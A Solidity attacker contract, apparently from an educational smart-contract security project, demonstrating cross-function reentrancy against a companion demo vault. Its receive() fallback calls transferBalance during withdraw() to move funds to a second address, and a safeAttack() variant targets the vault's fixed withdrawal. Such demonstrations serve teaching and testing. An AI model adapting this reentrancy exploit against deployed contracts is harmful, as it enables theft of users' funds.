// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import { CrossFunctionVault } from "src/security/reentrancy/cross-function/CrossFunctionVault.sol";

contract CrossFunctionAttacker {
    CrossFunctionVault public vault;
    address public attacker;
    address public bob;

    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(CrossFunctionVault vault_, address attacker_, address bob_) {
        vault = vault_;
        attacker = attacker_;
        bob = bob_;
    }

    function attack() external payable {
        require(msg.value == ATTACK_AMOUNT);

        vault.deposit{ value: msg.value }();
        vault.withdraw();
    }

    receive() external payable {
        vault.transferBalance(bob, ATTACK_AMOUNT);
    }

    function updateVault(address vault_) external {
        require(msg.sender == attacker);
        vault = CrossFunctionVault(vault_);
    }

    function safeAttack() external payable {
        require(msg.value == ATTACK_AMOUNT);

        vault.deposit{ value: msg.value }();
        vault.safeWithdraw();
    }
}
